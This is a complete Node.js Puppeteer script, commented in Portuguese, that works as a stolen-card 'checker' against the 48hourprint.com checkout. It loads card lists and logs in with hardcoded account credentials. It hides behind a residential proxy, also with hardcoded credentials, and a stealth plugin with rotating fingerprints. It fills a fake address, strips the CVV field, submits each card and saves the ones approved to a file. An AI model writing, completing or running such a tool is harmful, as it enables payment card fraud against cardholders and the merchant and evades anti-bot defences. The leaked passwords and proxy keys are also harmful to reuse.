// chk.mjs — Puppeteer stealth: WORKERS PARALELOS ISOLADOS (OTIMIZADO P/ VELOCIDADE)
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';

puppeteer.use(StealthPlugin());

const PROXY_HOST = 'gw.dataimpulse.com';
const PROXY_PORT = '823';
const PROXY_USER_BASE = 'fcc2104ef57c31dc6666__cr.us';
const PROXY_PASS = 'd95e2bdc2fe685f5';

const CREDENTIALS = {
  email: 'pedroaugusto99pop1@gmail.com',
  password: 'Pedro17081998@',
};

const HEADLESS = process.env.HEADLESS !== 'false';
const NUM_WORKERS = Math.max(1, Math.min(Number(process.env.WORKERS) || 2, 2));
const MAX_RETRIES = Number(process.env.MAX_RETRIES) || 1;
const RETRY_DELAY_MS = 1500;

function carregarCartoes(caminho = 'lista.txt') {
  if (!fs.existsSync(caminho)) {
    console.error(`❌ Arquivo "${caminho}" não encontrado!`);
    process.exit(1);
  }
  const linhas = fs.readFileSync(caminho, 'utf-8')
    .split(/\r?\n/).map((l) => l.trim())
    .filter((l) => l && !l.startsWith('#'));

  const cartoes = [];
  const vistos = new Set();
  for (const linha of linhas) {
    const partes = linha.split('|').map((p) => p.trim());
    if (partes.length !== 4) continue;
    const [number, expMonth, expYear, cvv] = partes;
    if (!/^\d{13,19}$/.test(number)) continue;
    const key = `${number}|${expMonth}|${expYear}`;
    if (vistos.has(key)) continue;
    vistos.add(key);
    cartoes.push({ number, expMonth, expYear, cvv, raw: linha });
  }
  return cartoes;
}

const CARDS = carregarCartoes('lista.txt');
if (CARDS.length === 0) {
  console.error('❌ Nenhum cartão válido');
  process.exit(1);
}

const ITEM_TO_ADD = {
  itemType: 'regular',
  calcParams: {
    attr3: '85017', attr5: '84913', attr309: '84912',
    attr409: '85025', attr410: '85014', attr411: 1094168,
    product_id: '1490',
  },
  pageTitle: 'Rolled Canvas Prints',
  couponCode: 'LOVEMYCANVAS',
  txType: 'j', itemTxType: 'ul',
  pageId: 360, pageRevisionId: 35142,
};

const CART_URL = 'https://checkout.48hourprint.com/cart';
const HOME_URL = 'https://www.48hourprint.com';

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];
const VIEWPORTS = [
  { width: 1366, height: 768 },
  { width: 1440, height: 900 },
];
const LANGUAGES = ['en-US,en;q=0.9'];
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

function novoFingerprint() {
  return {
    ua: pick(UAS),
    viewport: pick(VIEWPORTS),
    language: pick(LANGUAGES),
    timezone: 'America/Los_Angeles',
  };
}

function gerarProxyDoWorker(workerId) {
  const sessionId = crypto.randomBytes(6).toString('hex');
  const username = `${PROXY_USER_BASE};session-${sessionId};sessTime-30`;
  return { host: PROXY_HOST, port: PROXY_PORT, username, password: PROXY_PASS, sessionId };
}

class FilaCartoes {
  constructor(cards) { this.cards = cards; this.proximoIndex = 0; }
  pegarProximo() {
    if (this.proximoIndex >= this.cards.length) return null;
    const index = this.proximoIndex++;
    return { card: this.cards[index], index };
  }
}

const STATUS = {
  pedidosAprovados: [],
  tentativas: [],
  sessoesExecutadas: 0,
  aprovadosCount: 0,
};

const APROVADOS_FILE = 'aprovados.txt';
const _aprovadosJaSalvos = new Set();
let _aprovadosInicializado = false;
let _aprovadosLock = Promise.resolve();

function inicializarAprovados() {
  if (_aprovadosInicializado) return;
  _aprovadosInicializado = true;
  try {
    if (fs.existsSync(APROVADOS_FILE)) {
      const conteudo = fs.readFileSync(APROVADOS_FILE, 'utf-8');
      for (const linha of conteudo.split(/\r?\n/)) {
        const l = linha.trim();
        if (!l || l.startsWith('#')) continue;
        _aprovadosJaSalvos.add(l);
      }
    } else {
      try { fs.writeFileSync(APROVADOS_FILE, '', { flag: 'a' }); } catch (_) {}
    }
  } catch (_) {}
}

function salvarAprovadoImediato(rawCartao) {
  inicializarAprovados();
  const linha = String(rawCartao).trim();
  if (!linha) return false;
  if (_aprovadosJaSalvos.has(linha)) return false;

  _aprovadosLock = _aprovadosLock.then(() => {
    try {
      if (_aprovadosJaSalvos.has(linha)) return;
      const conteudo = linha.endsWith('\n') ? linha : linha + '\n';
      const fd = fs.openSync(APROVADOS_FILE, 'a');
      try {
        fs.writeSync(fd, conteudo);
        fs.fsyncSync(fd);
      } finally {
        fs.closeSync(fd);
      }
      _aprovadosJaSalvos.add(linha);
    } catch (_) {
      try {
        fs.appendFileSync(APROVADOS_FILE, linha + '\n');
        _aprovadosJaSalvos.add(linha);
      } catch (_) {}
    }
  }).catch(() => {});
  return true;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function safeGoto(page, url, opts = {}) {
  const options = { waitUntil: 'domcontentloaded', timeout: 45000, ...opts };
  try {
    await page.goto(url, options);
  } catch (err) {
    if (/ERR_ABORTED|Navigation timeout|net::ERR_/.test(err.message)) return;
    throw err;
  }
}

async function safeEval(target, fn, ...args) {
  try {
    return await target.evaluate(fn, ...args);
  } catch (e) {
    if (/detached|Execution context|Cannot find context/i.test(e.message)) {
      return { __retryable: true, error: e.message };
    }
    return { __error: true, error: e.message };
  }
}

async function fastWait(page, fn, timeout = 15000) {
  try {
    return await page.waitForFunction(fn, { timeout, polling: 100 });
  } catch (_) { return false; }
}

async function fastSelector(target, selector, timeout = 12000) {
  try {
    await target.waitForSelector(selector, { visible: true, timeout });
    return true;
  } catch (_) { return false; }
}

async function executarSessao(workerId, card, proxy) {
  const FP = novoFingerprint();
  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), `pptr_w${workerId}_`));

  let browser = null;
  try {
    browser = await puppeteer.launch({
      headless: HEADLESS ? 'new' : false,
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
      defaultViewport: null,
      userDataDir,
      args: [
        `--proxy-server=http://${proxy.host}:${proxy.port}`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-software-rasterizer',
        '--disable-extensions',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-default-apps',
        '--disable-component-update',
        '--disable-client-side-phishing-detection',
        '--disable-hang-monitor',
        '--disable-popup-blocking',
        '--disable-prompt-on-repost',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--no-default-browser-check',
        '--single-process',
        '--disable-features=Translate,BackForwardCache,AcceptCHFrame,MediaRouter,OptimizationHints,CalculateNativeWinOcclusion,InterestCohort',
        '--blink-settings=imagesEnabled=false',
        '--js-flags=--max-old-space-size=256',
        `--window-size=${FP.viewport.width},${FP.viewport.height}`,
      ],
    });
  } catch (e) {
    try { fs.rmSync(userDataDir, { recursive: true, force: true }); } catch (_) {}
    return { status: null, motivo: 'erro_launch: ' + e.message, authorize: null, retryable: true };
  }

  const SESSION = {
    accessToken: '', cartId: '', vid: '', logado: false,
    pagamento: null, motivo: '', authorizeResponse: null,
  };

  try {
    const page = await browser.newPage();
    await page.authenticate({ username: proxy.username, password: proxy.password });
    await page.setUserAgent(FP.ua);
    await page.setViewport(FP.viewport);
    await page.setExtraHTTPHeaders({ 'Accept-Language': FP.language });
    try { await page.emulateTimezone(FP.timezone); } catch (_) {}

    page.on('response', async (res) => {
      if (!res.url().includes('/process-authorize/')) return;
      try {
        const json = await res.json();
        SESSION.authorizeResponse = json;
        const hasErrorCode = !!json.error_code;
        const isApproved =
          !hasErrorCode &&
          (json.status === 'approved' || json.statusCode === 200 ||
            json.is_show_form === false || json.approved === true ||
            !!json.authorization_token);
        if (isApproved) {
          SESSION.pagamento = true;
          SESSION.motivo = 'APPROVED';
        } else if (hasErrorCode) {
          SESSION.pagamento = false;
          SESSION.motivo = `FAILED — ${json.error_code}`;
        } else {
          SESSION.motivo = 'resposta inesperada';
        }
      } catch (_) {}
    });

    let loginOk = false;
    for (let tent = 1; tent <= 3 && !loginOk; tent++) {
      try {
        await safeGoto(page, HOME_URL);

        if (!await fastSelector(page, '#my_account_wrapper_desktop', 12000)) {
          throw new Error('account wrapper não apareceu');
        }
        await page.hover('#my_account_wrapper_desktop');
        await sleep(300);
        await safeEval(page, () => {
          const dd = document.querySelector('#my_account_wrapper_desktop .customer-settings');
          if (dd) { dd.style.display = 'block'; dd.style.visibility = 'visible'; dd.style.opacity = '1'; }
        });
        await sleep(200);

        const loginBtnSel = '#my_account_wrapper_desktop .customer-settings li.login-button';
        if (await fastSelector(page, loginBtnSel, 6000)) {
          await page.click(loginBtnSel).catch(() => {});
        }

        let modalOk = await fastSelector(page, '#login_register_modal input[name="email"]', 8000);
        if (!modalOk) {
          await safeEval(page, () => {
            try {
              const el = document.querySelector('#my_account_wrapper_desktop');
              let node = el;
              while (node) {
                const scope = window.angular && window.angular.element(node).scope();
                if (scope && typeof scope.openAuthModal === 'function') { scope.openAuthModal('login'); return; }
                node = node.parentElement;
              }
            } catch (_) {}
          });
          modalOk = await fastSelector(page, '#login_register_modal input[name="email"]', 8000);
        }
        if (!modalOk) throw new Error('modal login não abriu');

        const emailSel = '#login_register_modal input[name="email"]';
        const passSel = '#login_register_modal input[name="password"]';
        await page.click(emailSel, { clickCount: 3 });
        await page.type(emailSel, CREDENTIALS.email, { delay: 15 });
        await page.click(passSel, { clickCount: 3 });
        await page.type(passSel, CREDENTIALS.password, { delay: 15 });

        const loginRespPromise = page.waitForResponse(
          (r) => r.url().includes('/customer-login') && r.request().method() === 'POST',
          { timeout: 25000 }
        ).catch(() => null);

        await page.click('#login_register_modal #login_button');

        const loginResp = await loginRespPromise;
        if (!loginResp) throw new Error('Login API não respondeu');
        const loginData = await loginResp.json();
        const accessToken =
          loginData.access_token || loginData.token ||
          loginData.data?.access_token || loginData.document?.access_token || '';
        if (!accessToken) throw new Error('Token não recebido');

        SESSION.accessToken = accessToken;
        SESSION.logado = true;
        await fastWait(page, () => {
          const m = document.querySelector('#login_register_modal');
          return !m || m.offsetParent === null || m.style.display === 'none';
        }, 6000);
        loginOk = true;
      } catch (e) {
        if (tent < 3) {
          await sleep(RETRY_DELAY_MS);
        } else {
          throw new Error('login_falhou: ' + e.message);
        }
      }
    }

    async function persistirCartIdNoFrontend(cartId, vid) {
      if (!cartId) return;
      try {
        const cookiesToSet = [
          { name: 'cart_id', value: String(cartId), domain: '.48hourprint.com', path: '/' },
          { name: 'cartId',  value: String(cartId), domain: '.48hourprint.com', path: '/' },
        ];
        if (vid) cookiesToSet.push({ name: 'vid', value: String(vid), domain: '.48hourprint.com', path: '/' });
        await page.setCookie(...cookiesToSet);
        await safeEval(page, (cid, v) => {
          try {
            localStorage.setItem('cart_id', String(cid));
            localStorage.setItem('cartId', String(cid));
            if (v) localStorage.setItem('vid', String(v));
            sessionStorage.setItem('cart_id', String(cid));
            sessionStorage.setItem('cartId', String(cid));
          } catch (_) {}
        }, cartId, vid);
      } catch (_) {}
    }

    async function checarCarrinhoAPI(token, cartId) {
      const vid = await safeEval(page, () => {
        const m = document.cookie.match(/(?:^|; )vid=([^;]*)/);
        return m ? decodeURIComponent(m[1]) : '';
      }).then(r => r && !r.__error ? r : (SESSION.vid || '')).catch(() => SESSION.vid || '');
      if (!cartId) return { itemCount: 0, vid, error: 'sem cartId' };

      const result = await safeEval(page, async (tkn, cId, vId) => {
        const url = `https://checkout-api.48hourprint.com/compute-cart/${cId}?vid=${vId}&website_code=48HP`;
        try {
          const r = await fetch(url, {
            headers: { authorization: 'Bearer ' + tkn, accept: 'application/json' },
          });
          const json = await r.json().catch(() => null);
          const doc = json ? (json.document || json) : {};
          const items = doc.items || {};
          return { httpStatus: r.status, itemCount: Object.keys(items).length };
        } catch (e) {
          return { httpStatus: 0, itemCount: 0, error: e.message };
        }
      }, token, cartId, vid);

      if (!result || result.__error) return { itemCount: 0, vid };
      return { ...result, vid };
    }

    async function adicionarItem(token, cartId, vid) {
      const r = await safeEval(page, async (tkn, cId, vId, item) => {
        const url = 'https://cart-api.48hourprint.com/create-cart-item?websiteCode=48HP';
        const body = { ...item };
        if (cId) body.cartId = Number(cId);
        try {
          const resp = await fetch(url, {
            method: 'POST',
            headers: {
              authorization: 'Bearer ' + tkn,
              'content-type': 'application/json;charset=UTF-8',
              'visitor-id': vId,
              'x-requested-with': 'XMLHttpRequest',
              accept: 'application/json',
            },
            body: JSON.stringify(body),
          });
          const json = await resp.json().catch(() => null);
          const doc = json ? (json.document || json) : {};
          const newCartId = doc.cart_id || doc.cartId || doc.id || '';
          return { status: resp.status, newCartId: String(newCartId || '') };
        } catch (e) {
          return { status: 0, newCartId: '', error: e.message };
        }
      }, token, cartId || '', vid || '', ITEM_TO_ADD);
      return r && !r.__error ? r : { status: 0, newCartId: '' };
    }

    async function garantirItemNoCarrinho(token, cartId, maxTentativas = 3) {
      for (let t = 1; t <= maxTentativas; t++) {
        const api = await checarCarrinhoAPI(SESSION.accessToken || token, SESSION.cartId || cartId);
        if (api.itemCount > 0) {
          await persistirCartIdNoFrontend(SESSION.cartId, SESSION.vid);
          return true;
        }
        if (!SESSION.accessToken && !token) return false;

        const addResult = await adicionarItem(SESSION.accessToken || token, SESSION.cartId || cartId, SESSION.vid);
        if (addResult.newCartId) {
          SESSION.cartId = addResult.newCartId;
          await persistirCartIdNoFrontend(SESSION.cartId, SESSION.vid);
        }
        await sleep(600);

        const api2 = await checarCarrinhoAPI(SESSION.accessToken || token, SESSION.cartId);
        if (api2.itemCount > 0) {
          await persistirCartIdNoFrontend(SESSION.cartId, SESSION.vid);
          return true;
        }
        if (t < maxTentativas) await sleep(800);
      }
      return false;
    }

    async function findPaymentFrames(timeoutMs = 20000) {
      const start = Date.now();
      while (Date.now() - start < timeoutMs) {
        const frames = page.frames();
        let cardFrame = null, formFrame = null;
        for (const frame of frames) {
          if (!frame.url() || frame.url() === 'about:blank') continue;
          if (!cardFrame) {
            const has = await Promise.race([
              frame.evaluate(() => !!(document.querySelector('#accountNumber') ||
                document.querySelector('input[name="accountNumber"]'))),
              new Promise((_, rej) => setTimeout(() => rej(new Error('t')), 600)),
            ]).catch(() => false);
            if (has === true) cardFrame = frame;
          }
          if (!formFrame) {
            const has = await Promise.race([
              frame.evaluate(() => !!(document.querySelector('#address1') ||
                document.querySelector('#submitBtn') ||
                document.querySelector('#payment_form'))),
              new Promise((_, rej) => setTimeout(() => rej(new Error('t')), 600)),
            ]).catch(() => false);
            if (has === true) formFrame = frame;
          }
          if (cardFrame && formFrame) return { cardFrame, formFrame };
        }
        await sleep(150);
      }
      return { cardFrame: null, formFrame: null };
    }

    function normalizarAno(yyyy) {
      const s = String(yyyy).trim();
      if (s.length === 4) return s.slice(-2);
      if (s.length === 2) return s.padStart(2, '0');
      return s;
    }
    function normalizarMes(mm) { return String(mm).trim().padStart(2, '0'); }

    async function selecionarSelectSeguro(frame, selector, valorDesejado, textoAlternativo = null) {
      let ok;
      try {
        ok = await frame.evaluate((sel, val) => {
          const el = document.querySelector(sel);
          if (!el) return false;
          const opt = Array.from(el.options).find((o) => o.value === val);
          if (!opt) return false;
          el.value = val;
          el.dispatchEvent(new Event('change', { bubbles: true }));
          el.dispatchEvent(new Event('blur', { bubbles: true }));
          return el.value === val;
        }, selector, String(valorDesejado));
      } catch (_) { ok = false; }
      if (ok) return valorDesejado;

      const semPad = String(valorDesejado).replace(/^0+/, '') || '0';
      try {
        ok = await frame.evaluate((sel, val) => {
          const el = document.querySelector(sel);
          if (!el) return false;
          const opt = Array.from(el.options).find((o) => o.value === val);
          if (!opt) return false;
          el.value = val;
          el.dispatchEvent(new Event('change', { bubbles: true }));
          el.dispatchEvent(new Event('blur', { bubbles: true }));
          return el.value === val;
        }, selector, semPad);
      } catch (_) { ok = false; }
      if (ok) return valorDesejado;

      if (textoAlternativo) {
        try {
          ok = await frame.evaluate((sel, txt) => {
            const el = document.querySelector(sel);
            if (!el) return false;
            const opt = Array.from(el.options).find((o) => (o.textContent || '').trim() === String(txt).trim());
            if (!opt) return false;
            el.value = opt.value;
            el.dispatchEvent(new Event('change', { bubbles: true }));
            el.dispatchEvent(new Event('blur', { bubbles: true }));
            return el.value === opt.value;
          }, selector, textoAlternativo);
        } catch (_) { ok = false; }
      }
      return ok ? valorDesejado : null;
    }

    async function criarCarrinhoEAdicionarItem() {
      SESSION.cartId = '';
      try {
        const cookies = await page.cookies();
        const paraApagar = cookies.filter((c) => ['cart_id', 'cartId'].includes(c.name));
        for (const c of paraApagar) await page.deleteCookie({ name: c.name, domain: c.domain, path: c.path });
      } catch (_) {}

      await safeGoto(page, CART_URL);
      await fastWait(page, () => /(?:^|; )vid=/.test(document.cookie), 8000);

      const vid = await safeEval(page, () => {
        const m = document.cookie.match(/(?:^|; )vid=([^;]*)/);
        return m ? decodeURIComponent(m[1]) : '';
      });
      if (vid && !vid.__error) SESSION.vid = vid;

      const ok = await garantirItemNoCarrinho(SESSION.accessToken, SESSION.cartId, 3);
      if (!ok) throw new Error('Não foi possível adicionar item');

      await persistirCartIdNoFrontend(SESSION.cartId, SESSION.vid);
      await safeGoto(page, CART_URL);
      await fastWait(page, () => {
        const btns = Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'))
          .filter((b) => b.offsetParent !== null);
        return btns.length > 0;
      }, 15000);
      return true;
    }

    async function clicarCheckoutComFallbacks() {
      let result = await safeEval(page, () => {
        const btns = Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'))
          .filter((b) => b.offsetParent !== null && /checkout/i.test(b.innerText || ''));
        if (btns.length === 0) return { ok: false };
        btns[btns.length - 1].click();
        return { ok: true };
      });
      if (result && result.ok) return result;

      result = await safeEval(page, () => {
        const btns = Array.from(document.querySelectorAll('button, a'))
          .filter((b) => b.offsetParent !== null && /checkout\s*now/i.test(b.innerText || ''));
        if (btns.length === 0) return { ok: false };
        btns[btns.length - 1].click();
        return { ok: true };
      });
      if (result && result.ok) return result;

      for (const url of [
        'https://checkout.48hourprint.com/checkout/shipping',
        'https://checkout.48hourprint.com/shipping',
      ]) {
        try {
          await safeGoto(page, url, { waitUntil: 'domcontentloaded', timeout: 30000 });
          const cur = page.url();
          if (!cur.endsWith('/cart')) return { ok: true };
        } catch (_) {}
      }
      return { ok: false };
    }

    async function fase2_checkout() {
      const pronto = await fastWait(page, () => {
        const btns = Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'));
        return btns.some((b) => b.offsetParent !== null && /checkout/i.test(b.innerText || ''));
      }, 15000);

      if (!pronto) {
        const ok = await garantirItemNoCarrinho(SESSION.accessToken, SESSION.cartId, 2);
        if (ok) {
          await persistirCartIdNoFrontend(SESSION.cartId, SESSION.vid);
          try { await page.reload({ waitUntil: 'domcontentloaded', timeout: 25000 }); } catch (_) {}
          await fastWait(page, () => {
            const btns = Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'));
            return btns.some((b) => b.offsetParent !== null && /checkout/i.test(b.innerText || ''));
          }, 12000);
        } else {
          throw new Error('Carrinho vazio');
        }
      }

      const clicked = await clicarCheckoutComFallbacks();
      if (!clicked.ok) throw new Error('Falha clique checkout');

      await fastWait(page, () => {
        const txt = document.body.innerText.toLowerCase();
        return txt.includes('pickup') || txt.includes('shipping') ||
          document.querySelector('.pickup-location') !== null;
      }, 20000);

      let pickupOk = await fastSelector(page, '.pickup-location', 10000);
      if (pickupOk) {
        await page.click('.pickup-location').catch(() => {});
      } else {
        await safeEval(page, () => {
          const els = Array.from(document.querySelectorAll('*')).filter(
            (el) => el.children.length === 0 && /pickup/i.test(el.innerText || '')
          );
          if (els.length) els[0].click();
        });
      }

      await fastWait(page, () => Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'))
        .some((b) => b.offsetParent !== null), 15000);

      await safeEval(page, () => {
        const btns = Array.from(document.querySelectorAll('button[data-qaid="continueButton"]'))
          .filter((b) => b.offsetParent !== null);
        if (btns.length === 0) return { ok: false };
        btns[btns.length - 1].click();
        return { ok: true };
      });

      await fastWait(page, () => {
        const txt = document.body.innerText.toLowerCase();
        return txt.includes('payment') || txt.includes('credit card') ||
          document.querySelector('input[name*="card"]') !== null;
      }, 18000);
    }

    async function fase3b_preencher_endereco(formFrame) {
      const ENDERECOS = [
        { address1: '1234 Sunset Blvd',   city: 'Los Angeles',  postal: '90028' },
        { address1: '5678 Hollywood Ave', city: 'Los Angeles',  postal: '90028' },
        { address1: '910 Maple Street',   city: 'Burbank',      postal: '91501' },
        { address1: '2468 Oak Drive',     city: 'Van Nuys',     postal: '91401' },
        { address1: '1357 Pine Road',     city: 'Pasadena',     postal: '91101' },
      ];
      const end = ENDERECOS[Math.floor(Math.random() * ENDERECOS.length)];

      try { await formFrame.waitForSelector('#address1', { visible: true, timeout: 12000 }); } catch (_) {}

      try {
        await formFrame.click('#address1', { clickCount: 3 });
        await formFrame.type('#address1', end.address1, { delay: 20 });
        const hasCity = await formFrame.evaluate(() => !!document.querySelector('#city_or_town')).catch(() => false);
        if (hasCity) {
          await formFrame.click('#city_or_town', { clickCount: 3 });
          await formFrame.type('#city_or_town', end.city, { delay: 20 });
        }
        const hasPostal = await formFrame.evaluate(() => !!document.querySelector('#postal_code')).catch(() => false);
        if (hasPostal) {
          await formFrame.click('#postal_code', { clickCount: 3 });
          await formFrame.type('#postal_code', end.postal, { delay: 20 });
        }
        const hasState = await formFrame.evaluate(() => !!document.querySelector('#state_or_province')).catch(() => false);
        if (hasState) {
          await formFrame.select('#state_or_province', 'CA').catch(() => {});
          await formFrame.evaluate(() => {
            const el = document.querySelector('#state_or_province');
            if (el) {
              el.dispatchEvent(new Event('change', { bubbles: true }));
              el.dispatchEvent(new Event('blur', { bubbles: true }));
            }
          }).catch(() => {});
        }
        await formFrame.evaluate(() => {
          ['#address1', '#city_or_town', '#postal_code'].forEach((sel) => {
            const el = document.querySelector(sel);
            if (el) {
              el.dispatchEvent(new Event('input', { bubbles: true }));
              el.dispatchEvent(new Event('change', { bubbles: true }));
              el.dispatchEvent(new Event('blur', { bubbles: true }));
            }
          });
        }).catch(() => {});
      } catch (_) {}
    }

    async function preencherDadosCartao(cardFrame, card) {
      const anoYY = normalizarAno(card.expYear);
      const mesMM = normalizarMes(card.expMonth);

      try {
        await cardFrame.click('#accountNumber', { clickCount: 3 });
        await cardFrame.type('#accountNumber', card.number, { delay: 30 });

        const numFilled = await cardFrame.$eval('#accountNumber', (el) => el.value).catch(() => '');
        if (numFilled.replace(/\s/g, '') !== card.number) {
          await cardFrame.evaluate((val) => {
            const el = document.querySelector('#accountNumber');
            el.value = val;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
          }, card.number).catch(() => {});
        }
        await cardFrame.evaluate(() => {
          const el = document.querySelector('#accountNumber');
          if (el) ['input', 'change', 'keyup', 'blur'].forEach((ev) =>
            el.dispatchEvent(new Event(ev, { bubbles: true })));
        }).catch(() => {});

        await selecionarSelectSeguro(cardFrame, '#expMonth', mesMM, mesMM);
        await selecionarSelectSeguro(cardFrame, '#expYear', anoYY, card.expYear);
      } catch (e) {
        if (/detached|Execution context/i.test(e.message)) throw new Error('card_frame_detached');
        throw e;
      }
    }

    async function removerCVV(cardFrame) {
      try {
        await cardFrame.evaluate(() => {
          const cvv = document.querySelector('#cvv');
          if (!cvv) return;
          const wrapper = cvv.closest('.form-group') || cvv.parentElement;
          if (wrapper) wrapper.remove();
          else cvv.remove();
        });
      } catch (_) {}
    }

    async function enviarPagamento(formFrame) {
      try { await formFrame.waitForSelector('#submitBtn', { visible: true, timeout: 12000 }); } catch (_) {}
      const r = await formFrame.evaluate(() => {
        const btn = document.querySelector('#submitBtn');
        if (btn && btn.offsetParent !== null && !btn.disabled) {
          btn.click();
          return true;
        }
        return false;
      }).catch(() => false);
      if (!r) throw new Error('Botão submit não encontrado');
    }

    async function aguardarAuthorize(timeoutMs = 60000) {
      SESSION.authorizeResponse = null;
      SESSION.pagamento = null;
      SESSION.motivo = '';
      const start = Date.now();
      while (Date.now() - start < timeoutMs) {
        if (SESSION.authorizeResponse) break;
        try {
          const url = page.url();
          if (url.includes('/confirmation') || url.includes('thank-you')) {
            if (!SESSION.authorizeResponse) {
              SESSION.pagamento = true;
              SESSION.motivo = 'URL confirmação';
            }
            break;
          }
        } catch (_) {}
        await sleep(300);
      }
      return SESSION.authorizeResponse;
    }

    await criarCarrinhoEAdicionarItem();
    await fase2_checkout();

    await sleep(800);

    const { cardFrame, formFrame } = await findPaymentFrames(18000);
    if (!cardFrame || !formFrame) {
      return { status: null, motivo: 'frames_nao_encontrados', authorize: null, retryable: true };
    }

    await fase3b_preencher_endereco(formFrame);

    try {
      await preencherDadosCartao(cardFrame, card);
    } catch (e) {
      if (/detached/i.test(e.message)) {
        return { status: null, motivo: 'card_frame_detached', authorize: null, retryable: true };
      }
      throw e;
    }

    await removerCVV(cardFrame);

    await enviarPagamento(formFrame);
    await aguardarAuthorize(60000);

    return {
      status: SESSION.pagamento,
      motivo: SESSION.motivo,
      authorize: SESSION.authorizeResponse,
      retryable: SESSION.pagamento === null,
    };

  } catch (err) {
    const msg = err.message || '';
    const retryable = /detached|Execution context|Login API|frames_nao|timeout|Navigation|net::ERR|Carrinho vazio|Não avançou|Sem continueButton|CONTINUE|pickup|Token|login_falhou/i.test(msg);
    return { status: null, motivo: 'erro: ' + msg, authorize: null, retryable };
  } finally {
    try { await browser.close(); } catch (_) {}
    try { fs.rmSync(userDataDir, { recursive: true, force: true }); } catch (_) {}
  }
}

async function worker(workerId, fila, proxy) {
  while (true) {
    const proximo = fila.pegarProximo();
    if (!proximo) return;

    const { card } = proximo;
    STATUS.sessoesExecutadas++;

    let resultado = null;
    let tentativa = 0;

    while (tentativa <= MAX_RETRIES) {
      tentativa++;
      if (tentativa > 1) await sleep(RETRY_DELAY_MS);
      resultado = await executarSessao(workerId, card, proxy);
      if (resultado.status === true || resultado.status === false) break;
      if (!resultado.retryable) break;
    }

    const rawCartao = `${card.number}|${card.expMonth}|${card.expYear}|${card.cvv}`;
    const statusHttp = resultado.authorize ? 200 : '---';

    console.log(`${rawCartao}     Status: ${statusHttp}`);

    if (resultado.status === true) {
      console.log(`[W${workerId}]    ✅✅✅ APROVADO`);
      STATUS.pedidosAprovados.push({ worker: workerId, cartao: rawCartao, authorize: resultado.authorize });
      STATUS.aprovadosCount++;
      salvarAprovadoImediato(rawCartao);
    } else if (resultado.status === false) {
      console.log(`[W${workerId}]    ❌❌❌ REPROVADO`);
    } else {
      console.log(`[W${workerId}]    ⚠️  INDETERMINADO — ${resultado.motivo}`);
    }

    STATUS.tentativas.push({
      worker: workerId,
      full: rawCartao,
      status: resultado.status === true ? 'aprovado' : resultado.status === false ? 'reprovado' : 'indeterminado',
      motivo: resultado.motivo || '',
    });
  }
}

function imprimirResumo() {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║              📊 RESUMO FINAL                 ║');
  console.log('╚══════════════════════════════════════════════╝');
  console.log(`   ✅ Aprovados: ${STATUS.aprovadosCount}`);
  console.log(`   ❌ Reprovados: ${STATUS.tentativas.filter(t => t.status === 'reprovado').length}`);
  console.log(`   ⚠️  Indeterminados: ${STATUS.tentativas.filter(t => t.status === 'indeterminado').length}`);
  console.log(`   📄 Total processado: ${STATUS.tentativas.length}`);
  console.log(`   💾 Total salvo em aprovados.txt: ${_aprovadosJaSalvos.size}`);
  if (STATUS.pedidosAprovados.length > 0) {
    console.log('');
    console.log('💚 APROVADOS NESTA EXECUÇÃO:');
    STATUS.pedidosAprovados.forEach((p, i) => {
      console.log(`   [${i + 1}] (W${p.worker}) ${p.cartao}`);
    });
  }
  console.log('');
}

(async () => {
  inicializarAprovados();

  const flushFinal = () => _aprovadosLock.catch(() => {});
  process.on('SIGINT', async () => { await flushFinal(); process.exit(0); });
  process.on('SIGTERM', async () => { await flushFinal(); process.exit(0); });
  process.on('beforeExit', async () => { await flushFinal(); });

  console.log(`🚀 ${CARDS.length} cartões | ${NUM_WORKERS} workers | headless=${HEADLESS} | retries=${MAX_RETRIES}`);
  console.log(`💾 Já salvos em ${APROVADOS_FILE}: ${_aprovadosJaSalvos.size}`);
  console.log('');

  const fila = new FilaCartoes(CARDS);
  const workers = [];
  for (let w = 1; w <= NUM_WORKERS; w++) {
    workers.push(worker(w, fila, gerarProxyDoWorker(w)));
  }

  await Promise.all(workers);
  await flushFinal();

  imprimirResumo();
  console.log('🏁 PROCESSO COMPLETO.');
})();